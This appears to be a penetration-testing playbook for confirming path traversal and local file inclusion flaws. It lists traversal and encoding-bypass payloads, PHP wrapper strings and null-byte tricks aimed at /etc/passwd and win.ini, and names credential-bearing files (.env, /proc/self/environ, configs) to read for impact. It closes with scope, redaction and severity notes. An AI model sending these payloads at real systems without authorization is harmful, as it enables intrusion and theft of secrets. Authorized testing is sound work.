# File read / path traversal

**When:** a request value builds a filesystem path. Params: `file`, `path`,
`page`, `template`, `download`, `include`, `doc`, `folder`, `name`.
Signals: `../` honored, absolute path accepted, download/view endpoints.

## Confirm

`probe_lfi` sends the standard set and greps for content markers:

- Unix: `../../../../../../etc/passwd`, `/etc/passwd` -> `root:x:0:0:`
- Encoding tricks: `....//....//etc/passwd`, `..%2f..%2f`, `%2e%2e/`,
  `..%c0%af`, `..%252f` (double-decode)
- Windows: `..\..\windows\win.ini`, `..\..\windows\system32\drivers\etc\hosts`
  -> `[fonts]` / `localhost`
- Null byte vs extension checks: `../../../etc/passwd%00.png`
- Wrappers (PHP): `php://filter/convert.base64-encode/resource=index.php`
  reads source base64'd; `file:///etc/passwd`; `expect://id` (rare).

The finding is confirmed when file CONTENT appears in the response - a 200
or a different size alone is not enough; quote the file bytes.

## What to read for impact (in scope order)

1. App source: `index.php`, `app.py`, `.env`, `config.php` -> credentials,
   keys, hidden routes. Source disclosure often beats the file read itself.
2. Service configs: `/etc/nginx/...`, `web.config`, `.htaccess`
3. Secrets: `/.env`, `/proc/self/environ`, cloud-init leftovers
4. Logs -> log poisoning chains (only when in scope and needed)

## Falsifier

Traversal and absolute payloads all return the same validated
error/empty/default response, and no wrapper scheme produces file bytes.

## Severity guide

Read outside web root confirmed: high. App source/.env recovered: high -
record the secret class, redact the value in the report body. Confined to
web root with no sensitive file reached: medium-low.
